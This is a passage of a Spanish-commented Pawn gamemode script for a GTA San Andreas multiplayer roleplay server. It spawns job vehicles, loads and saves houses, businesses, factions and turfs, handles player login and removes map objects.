	AddStaticVehicleEx(574,1612.30004883,-1890.09997559,13.30000019,270.00000000,1,-1,600); //Sweeper
	AddStaticVehicleEx(574,1612.30004883,-1887.40002441,13.30000019,270.00000000,1,-1,600); //Sweeper 67
	//======Job cosechador======//
	AddStaticVehicleEx(532,-371.73156738,-1464.68566895,26.83628082,270.00000000,-1,-1,600); //Combine
	AddStaticVehicleEx(532,-372.02117920,-1476.42980957,26.83628082,270.00000000,-1,-1,600); //Combine
	AddStaticVehicleEx(532,-369.85134888,-1489.54174805,26.83628082,288.00000000,-1,-1,600); //Combine 70
	//======Job securicar======//
	AddStaticVehicleEx(428,598.9907,-1297.1332,14.9240,14.0852,245,1,600); //Securicar
	AddStaticVehicleEx(428,593.4097,-1298.3533,14.8839,12.7599,245,1,600); //Securicar
	AddStaticVehicleEx(428,586.4548,-1294.5554,15.3165,282.1453,245,1,600); //Securicar 73
	//======Job pizzero======//
	AddStaticVehicleEx(448,2106.5234,-1788.9923,13.1571,0.00000000,3,1,600); //Pizzaboy
	AddStaticVehicleEx(448,2109.5234,-1788.9923,13.1571,0.00000000,3,1,600); //Pizzaboy
	AddStaticVehicleEx(448,2112.5234,-1788.9923,13.1571,0.00000000,3,1,600); //Pizzaboy
	AddStaticVehicleEx(448,2115.5234,-1788.9923,13.1571,0.00000000,3,1,600); //Pizzaboy
	AddStaticVehicleEx(448,2118.5234,-1788.9923,13.1571,0.00000000,3,1,600); //Pizzaboy
	AddStaticVehicleEx(448,2121.5234,-1788.9923,13.1571,0.00000000,3,1,600); //Pizzaboy 79
	//======Job fumigador aéreo======//
	AddStaticVehicleEx(512,-427.8985,-1745.2548,7.5919,301.5764,3,1,600); //Cropduster 80
	//======Job taxista======//
	AddStaticVehicleEx(420,1802.8204,-1903.1697,13.1792,90.0000000,6,1,600); //Taxi
	AddStaticVehicleEx(420,1802.8204,-1908.2688,13.1762,90.0000000,6,1,600); //Taxi
	AddStaticVehicleEx(420,1802.8204,-1912.9968,13.1757,90.0000000,6,1,600); //Taxi
	AddStaticVehicleEx(420,1802.8204,-1918.2117,13.1729,90.2500000,6,1,600); //Taxi
	AddStaticVehicleEx(420,1802.8204,-1923.2921,13.1717,90.2470000,6,1,600); //Taxi
	AddStaticVehicleEx(420,1802.8204,-1928.2810,13.1667,90.2470000,6,1,600); //Taxi 86
	//======Job pescador======//
	AddStaticVehicleEx(453,2967.8000000,-1525.9000000,0.0000000,260.0000000,1,1,600); //Reefer
	AddStaticVehicleEx(453,2966.3999000,-1534.0000000,0.0000000,260.0000000,1,1,600); //Reefer 88
	
	//Cargado de vehículos privados
	LoadCar();
	//Contador de total de vehículos creados
	for(new i = 1; i < MAX_VEHICLES; i++)
	{
	    if(!IsValidVehicle(i)){break;}
	  	TotalVeh++;
	}
    //Loop vehículos
    for(new i = 1; i <= TotalVeh; i++)
    {
	    //Vehículos en depósito
	    if(CarInfo[i][cEnDeposito] == 1) //Desguace
	    {
	        SetVehicleVirtualWorld(i, i+1);
	    }
	    //Sistema arranque de vehiculos
	    if(!IsABike(i))
		{
			new alarm,doors,bonnet,boot,objective;
    		SetVehicleParamsEx(i,0,0,alarm,doors,bonnet,boot,objective);
    	}
    	if(IsABike(i))
   	 	{
    		new alarm,doors,bonnet,boot,objective;
    		SetVehicleParamsEx(i,1,0,alarm,doors,bonnet,boot,objective);
    	}
	    //Vehículos LSN
	    if(CocheLSN(i)){DirectoLSNCoche[i] = NOEXISTE;}
	    //Gasolina 100 para coches scripteados
	    if(i <= MAX_VEHPUBLICO)
	    {
			CarInfo[i][cGas] = 100;
	    }
	    //Matrículas
	    SetVehicleMatricula(i);
	    //Maleteros vehículos de facciones
	    if(i <= 57)
	    {
			CarInfo[i][cMaxMaletero] = 7;
	    }
    }
    
    //Cargado características vehículos comprados
    for(new i = MAX_VEHPUBLICO+1; i <= TotalVeh; i++)
	{
		if(!IsABike(i))
		{
			new engine,lights,alarm,bonnet,boot,objective;
    		SetVehicleParamsEx(i,engine,lights,alarm,CarInfo[i][cCerrado],bonnet,boot,objective);
    	}
    }
    
    //Cargado de casas y 3DTextLabels de casas
    LoadCasas();

	for(new h = 1; h <= TotalCasas; h++)
	{
	    if(HouseInfo[h][hEntradaX] != 0.0)
	    {
			HouseInfo[h][hPickup] = CreateDynamic3DTextLabel("",Verde,HouseInfo[h][hEntradaX], HouseInfo[h][hEntradaY], HouseInfo[h][hEntradaZ],7.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,HouseInfo[h][hVirtualWorld2],HouseInfo[h][hInterior2]);
			UpdateHouseLabel(h);
		}
	}
	
	//Cargado de negocios y 3DTextLabels de negocios
	LoadNegocios();
	
	for(new n = 1; n <= TotalNegs; n++)
	{
	    if(NegoInfo[n][nEntradaX] != 0.0)
	    {
			NegoInfo[n][nPickup] = CreateDynamic3DTextLabel("",Verde,NegoInfo[n][nEntradaX], NegoInfo[n][nEntradaY], NegoInfo[n][nEntradaZ],10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,NegoInfo[n][nVirtualWorld2],NegoInfo[n][nInterior2]);
			UpdateNegocioLabel(n);
		}
	}
	
	//Cargado turfs
	LoadTurfs();
	
	//Cargado facciones
	LoadFaccs();
	
	//Cargado de plantaciones
	LoadPlantacion();
	
    return 1;
}

public OnGameModeExit()
{
    new cuenta;
	for(new idx=MAX_VEHPUBLICO+1; idx <= TotalVeh; idx++)
	{
		SaveCar(idx);
		cuenta++;
	}
	printf("Coches guardados: %d", cuenta);
	
	cuenta = 0;
	for(new x=1; x<=TotalCasas; x++)
    {
    	SaveCasa(x); //Guardado de casas
    	cuenta++;
    }
    printf("Casas guardadas: %d (MAX: %d)", cuenta, MAX_HOUSES);
    
    cuenta = 0;
    for(new x=1; x<=TotalNegs; x++)
    {
    	SaveNegocios(x); //Guardado de negocios
    	cuenta++;
    }
    printf("Negocios guardados: %d (MAX: %d)", cuenta, MAX_NEGS);
    
    cuenta = 0;
    for(new x=1; x<=TotalTurfs; x++)
    {
    	SaveTurf(x); //Guardado de turfs
    	cuenta++;
    }
    printf("Turfs guardados: %d (MAX: %d)", cuenta, MAX_TURFS);
    
    cuenta = 0;
    for(new x=1; x<=TotalFaccs; x++)
    {
    	SaveFacc(x); //Guardado de facciones
    	cuenta++;
    }
    printf("Facciones guardadas: %d (MAX: %d)", cuenta, MAX_FACCS);
    
    cuenta = 0;
    for(new x=0; x<=CodigoPlantacion; x++)
    {
        if(strlen(PlantaInfo[x][plPlantador]))
        {
	    	SavePlantacion(x); //Guardado de plantaciones
	    	cuenta++;
    	}
    }
    printf("Plantaciones guardadas: %d (MAX: %d)", cuenta, MAX_PLANTACIONES);
    return 1;
}

public OnQueryError(errorid, error[], callback[], query[], connectionHandle )
{
	printf("[ERROR] ID: %d - Error: %s - Callback - %s - Query: %s", errorid, error, callback, query);
    return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(JugadorRegistrado[playerid] == 1) //Si está registrado, loguear.
	{
		if(JugadorLogueado[playerid] == 0)
		{
			new string[100];
			new Nombre[MAX_PLAYER_NAME];
			LimpiarChat(playerid, 12);
			format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
			format(string,sizeof(string),"Bienvenido %s\nEscribe tu contraseña para entrar.",Nombre);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_PASSWORD,"Nexus RP",string,"Entrar","Salir");

			SetTimerEx("LoginKick", 60000, false, "i", playerid);
			
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid,0);
			TogglePlayerControllable(playerid, 0);
			new Random = random(sizeof(RandLogin));
			SetPlayerCameraPos(playerid, RandLogin[Random][0],RandLogin[Random][1],RandLogin[Random][2]);
			SetPlayerCameraLookAt(playerid, RandLogin[Random][3],RandLogin[Random][4],RandLogin[Random][5]);
			SetPlayerPos(playerid, RandLogin[Random][6],RandLogin[Random][7],RandLogin[Random][8]);
		}
		else SpawnPlayer(playerid); //Si está logueado, spawnear.
	}
	if(JugadorRegistrado[playerid] == 0) //Si no está registrado, expulsar.
	{
		new string[128];
		new Nombre[MAX_PLAYER_NAME];
		LimpiarChat(playerid, 12);
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		format(string, sizeof(string), "La cuenta '%s' no está certificada.", Nombre);
		SendClientMessage(playerid, Amarillo, string);
		SendClientMessage(playerid, Amarillo, "Para certificarte ve a www.nexus-rp.es/registro y envía el formulario.");
		KickL(playerid);
	}
	return 1;
}

public OnPlayerConnect(playerid)
{
	if(ConectadoBaseDatos == 0){SendClientMessage(playerid, Amarillo, "El servidor no se encuentra conectado a la base de datos. Contacta con un administrador."); KickL(playerid);}
    //new string[128];
    Anims_OnPlayerConnect(playerid);

    ResetPlayerVars(playerid); //Resetea todas las variables del jugador
    DestroyDynamic3DTextLabel(Yo3DText[playerid]);
    
    TextDrawShowForPlayer(playerid, Foro); //Textdraw foro
    
    new Nombre[MAX_PLAYER_NAME]; //Comprueba si la cuenta está registrada
	GetPlayerName(playerid, Nombre, sizeof(Nombre));
    if(CheckAccountExists(Nombre) != 0){JugadorRegistrado[playerid] = 1;}
  
    SetPlayerColor(playerid,Blanco2); //Cambia el color del jugador a transparente
	
	//RemoveBuildings
	RemoveBuildingForPlayer(playerid, 14843, 266.3516, 81.1953, 1001.2813, 0.25); //Celdas de LSPD
    RemoveBuildingForPlayer(playerid, 14849, 222.0469, 118.4766, 1007.2734, 0.25); //Lamparas LSPD
    RemoveBuildingForPlayer(playerid, 14896, 257.1094, 117.3047, 1009.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 14897, 243.2031, 117.3047, 1009.1250, 0.25);
    RemoveBuildingForPlayer(playerid, 14903, 269.8047, 117.5234, 1009.1250, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1529.2891, -1832.9141, 15.2891, 0.25); //Farola garaje ayuntamiento
    RemoveBuildingForPlayer(playerid, 3769, 1961.4453, -2216.1719, 14.9844, 0.25); //Objetos aeropuerto
	RemoveBuildingForPlayer(playerid, 3780, 1884.1719, -2541.3750, 14.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3780, 1652.3438, -2541.3750, 14.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3780, 1381.1172, -2541.3750, 14.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3665, 1652.3438, -2541.3750, 14.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3665, 1884.1719, -2541.3750, 14.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3664, 2042.7734, -2442.1875, 19.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 3664, 1960.6953, -2236.4297, 19.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 3625, 1961.4453, -2216.1719, 14.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 3665, 1381.1172, -2541.3750, 14.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3664, 1388.0078, -2593.0000, 19.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 3664, 1388.0078, -2494.2656, 19.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 1676, 0.0, 0.0, 0.0, 6000.0); //Surtidores explosivos
	RemoveBuildingForPlayer(playerid, 1686, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 3631, 2149.1406, -2266.9063, 12.8750, 0.25); //Interior desguace
	RemoveBuildingForPlayer(playerid, 5260, 2161.3438, -2264.9141, 14.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 3631, 2161.8516, -2264.0938, 16.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 3631, 2163.3750, -2262.6875, 16.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2142.9141, -2256.3359, 13.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2144.2969, -2258.1484, 13.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3631, 2142.3047, -2255.8984, 12.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 5262, 2152.7109, -2256.7813, 15.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2158.0078, -2257.2656, 16.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2167.6641, -2256.7813, 12.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2167.6641, -2256.7813, 13.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2167.6641, -2256.7813, 14.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2167.8047, -2257.3516, 16.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2167.1719, -2257.1250, 16.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3577, 2170.0781, -2257.6641, 16.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2169.3516, -2258.0703, 17.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2168.8281, -2257.5234, 17.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2140.3828, -2254.1016, 13.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2150.6641, -2251.5547, 12.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2150.2813, -2250.8516, 12.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2150.6953, -2252.9141, 16.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2149.8125, -2253.3672, 16.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 5261, 2152.2578, -2239.4609, 14.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 5269, 2146.3750, -2248.7969, 14.6172, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2153.7734, -2253.0859, 14.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2154.5078, -2254.4766, 14.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2158.5703, -2251.0156, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2158.0469, -2250.5078, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 5132, 2163.2891, -2251.6094, 14.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 5259, 2168.8438, -2246.7813, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 3577, 2160.5625, -2234.8047, 14.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 3577, 2160.5781, -2234.8203, 13.0234, 0.25);
	//Prisión federal
	RemoveBuildingForPlayer(playerid, 1499, 2522.3516, -1303.4063, 1047.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2522.3359, -1300.3984, 1047.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 2605, 2526.1641, -1299.0859, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2527.0156, -1299.0859, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2530.8359, -1304.1484, 1047.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2530.8516, -1307.1563, 1047.2734, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.0781, -1304.5000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1250, -1304.5000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.0781, -1302.5625, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2543.0703, -1301.0000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1250, -1302.5625, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2551.1172, -1301.0000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1016, -1304.5000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1016, -1302.5625, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2559.0938, -1301.0000, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2571.3359, -1300.3984, 1043.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2571.3516, -1303.4063, 1043.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 2608, 2522.8203, -1297.1797, 1048.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 2605, 2526.1641, -1297.1094, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2527.0156, -1297.1094, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2200, 2522.7500, -1295.6328, 1047.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 2609, 2530.2188, -1295.2109, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2609, 2530.2188, -1295.6797, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 14451, 2526.5938, -1293.9219, 1051.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 2609, 2530.2188, -1294.7500, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2610, 2530.2188, -1294.2578, 1048.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2544.1484, -1294.9141, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2541.7578, -1294.9141, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2553.5625, -1294.9141, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2558.2891, -1294.9141, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2555.9141, -1294.9141, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2526.1719, -1290.8672, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2605, 2527.0234, -1290.8594, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2608, 2522.8203, -1290.9375, 1048.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 2609, 2530.2188, -1290.7422, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2610, 2530.2188, -1290.2500, 1048.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 2609, 2530.2188, -1289.7656, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 934, 2543.1953, -1293.4141, 1044.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2544.1484, -1291.9766, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2541.7578, -1291.9766, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 934, 2553.4375, -1293.4141, 1044.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2553.5625, -1291.9766, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2558.2891, -1291.9766, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 941, 2555.9141, -1291.9766, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 934, 2558.6875, -1293.4141, 1044.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 922, 2565.6250, -1292.9609, 1044.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2608, 2522.8203, -1289.0313, 1048.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 2609, 2530.2188, -1289.3047, 1048.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2527.0156, -1288.8828, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2526.1719, -1288.8906, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2200, 2522.7500, -1287.5469, 1047.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 2200, 2522.7500, -1285.2656, 1047.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2526.1719, -1282.9063, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2605, 2527.0234, -1282.8984, 1047.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 2200, 2530.4453, -1284.3750, 1047.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 2676, 2538.0625, -1281.7969, 1043.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 14435, 2541.0938, -1285.8984, 1052.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2543.1016, -1286.3125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.1250, -1284.7500, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2543.1250, -1282.8125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1016, -1282.8125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2551.1016, -1284.7500, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2551.1016, -1286.3125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 936, 2559.1250, -1286.3125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1094, -1284.7500, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 937, 2559.1094, -1282.8125, 1043.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 14445, 2562.8828, -1287.1563, 1049.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 942, 2574.6563, -1306.2266, 1045.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 923, 2576.6016, -1301.7734, 1044.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 922, 2577.0234, -1298.8750, 1044.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 922, 2572.1641, -1296.7891, 1044.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 923, 2572.5156, -1293.9141, 1044.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2577.8516, -1291.4063, 1043.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 942, 2572.7031, -1282.5234, 1045.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 939, 2572.7500, -1287.7344, 1045.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2577.8359, -1288.3984, 1043.1172, 0.25);
	//LSN
	RemoveBuildingForPlayer(playerid, 1689, 745.5859, -1381.1094, 25.8750, 0.25); //Respiraderos helipuerto
	RemoveBuildingForPlayer(playerid, 1689, 751.3359, -1368.0313, 25.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 778.8594, -1391.1563, 16.3125, 0.25); //Farola parking
	//Puertas Pay'n'Spray y garajes bomba
	RemoveBuildingForPlayer(playerid, 5043, 1843.3672, -1856.3203, 13.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 5422, 2071.4766, -1831.4219, 14.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 5856, 1024.9844, -1029.3516, 33.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 5779, 1041.3516, -1025.9297, 32.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 6400, 488.2813, -1734.6953, 12.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 13028, 720.0156, -462.5234, 16.8594, 0.25);
	RemoveBuildingForPlayer(playerid, 5340, 2644.8594, -2039.2344, 14.0391, 0.25);
	//Arboles zona fumigación aerea
	RemoveBuildingForPlayer(playerid, 785, -617.3047, -1408.3906, 13.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 785, -614.4922, -1344.0156, 15.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 785, -608.4922, -1280.5156, 15.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 785, -445.6875, -1517.4688, 13.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 785, -652.4688, -1201.7734, 14.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 785, -535.4766, -1851.0703, 8.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 785, -473.2578, -1842.7266, 5.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -607.0469, -1467.2344, 15.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -617.3047, -1408.3906, 13.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -614.4922, -1344.0156, 15.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -608.4922, -1280.5156, 15.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -488.1172, -1441.3750, 17.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -448.0938, -1442.9531, 23.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 735, -461.9766, -1459.5703, 15.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -425.9531, -1432.7813, 25.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 735, -420.5547, -1459.5703, 21.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -652.4688, -1201.7734, 14.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -303.1953, -1196.6250, 22.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 693, -274.2734, -1189.9922, 16.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -270.8828, -1214.6797, 9.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -535.4766, -1851.0703, 8.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -473.2578, -1842.7266, 5.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 731, -474.2188, -1799.6953, 10.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 731, -493.0078, -1781.6328, 6.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 731, -473.2266, -1748.6016, 11.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 733, -512.1172, -1769.7266, 25.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 727, -462.6250, -1770.7266, 6.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 730, -439.5391, -1741.8359, 5.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 732, -452.8828, -1742.6484, 6.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 726, -427.0938, -1671.5234, 13.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 733, -461.0391, -1690.5781, 7.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 735, -372.7500, -1758.1172, 5.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 731, -382.3594, -1735.4766, 11.1328, 0.25);
	RemoveBuildingForPlayer(playerid, 734, -410.9219, -1720.9141, 8.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 727, -388.6094, -1687.1719, 17.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 734, -342.2969, -1761.5156, 12.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 734, -331.0625, -1736.1172, 12.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 734, -348.6563, -1738.5391, 11.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 733, -322.9922, -1717.7031, 14.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 733, -313.2500, -1662.5391, 17.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 733, -510.2734, -1606.4609, 3.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 733, -479.1484, -1645.2266, 5.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 726, -420.4453, -1654.6016, 10.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 726, -441.4453, -1645.3281, 10.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 727, -390.4141, -1638.7734, 21.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 670, -604.3906, -1517.5391, 11.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 791, -445.6875, -1517.4688, 13.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 735, -410.7031, -1520.8203, 20.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 693, -601.3125, -1494.3516, 17.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 790, -396.6484, -1482.0078, 29.6484, 0.25);
	//Motel jefferson
	RemoveBuildingForPlayer(playerid, 14511, 2219.7031, -1189.8438, 1029.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 14521, 2247.1641, -1162.1094, 1029.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 2744, 1721.6172, -1655.6641, 21.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 2756, 1712.5938, -1655.6016, 21.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 2756, 1730.5000, -1655.5078, 21.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 2759, 1715.7266, -1655.6016, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2759, 1727.3672, -1655.5078, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2757, 1715.6719, -1655.6016, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2757, 1727.4219, -1655.5078, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2761, 1716.3438, -1655.6016, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2761, 1726.7500, -1655.5078, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2758, 1715.6250, -1655.6016, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2758, 1727.4688, -1655.5078, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2760, 1715.8125, -1655.6016, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2760, 1727.2813, -1655.5078, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2756, 1730.5469, -1647.6484, 21.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 2759, 1727.4141, -1647.6484, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2757, 1727.4688, -1647.6484, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2761, 1726.7969, -1647.6484, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2758, 1727.5156, -1647.6484, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2760, 1727.3281, -1647.6484, 21.1563, 0.25);
